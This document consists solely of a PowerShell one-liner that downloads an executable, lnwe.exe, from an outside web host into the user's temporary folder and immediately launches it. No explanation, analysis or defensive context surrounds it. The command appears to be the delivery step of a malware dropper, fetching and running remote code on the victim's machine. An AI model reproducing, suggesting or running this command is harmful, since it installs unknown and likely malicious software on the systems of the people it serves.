
(New-Object System.Net.WebClient).DownloadFile('http://www.bryonz.com/emotions/files/lnwe.exe',"$env:TEMP\lnwe.exe");Start-Process ("$env:TEMP\lnwe.exe")

